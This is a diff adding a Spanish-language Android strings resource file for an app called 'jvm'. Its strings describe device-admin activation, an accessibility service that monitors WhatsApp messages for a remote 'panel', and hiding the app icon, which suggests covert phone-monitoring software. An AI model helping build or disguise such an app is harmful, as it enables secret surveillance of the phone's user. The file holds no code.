@@ -1,0 +1,20 @@
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+   <!-- Nombre de la app -->
+    <string name="app_name">jvm</string>
+
+    <!-- Explicación para Device Admin -->
+    <string name="device_admin_explanation">
+        Activa el administrador de dispositivos para funciones avanzadas.
+    </string>
+    <!-- Texto para mostrar número de teléfono -->
+    <string name="unhide_phone_number">Mostrar número de teléfono</string>
+    
+    <string name="accessibility_service_description">Monitorea mensajes enviados en WhatsApp para mostrar en tu panel.</string>
+    <!-- Estas tres faltantes: -->
+    <string name="oops_failed_to_open_google_play_please_open_it_manually">
+        ¡Vaya! No pude abrir Google Play. Por favor, ábrelo manualmente.
+    </string>
+    <string name="open_google_play">Abrir Google Play</string>
+    <string name="hide_app_icon">Ocultar icono de la app</string>
+</resources>
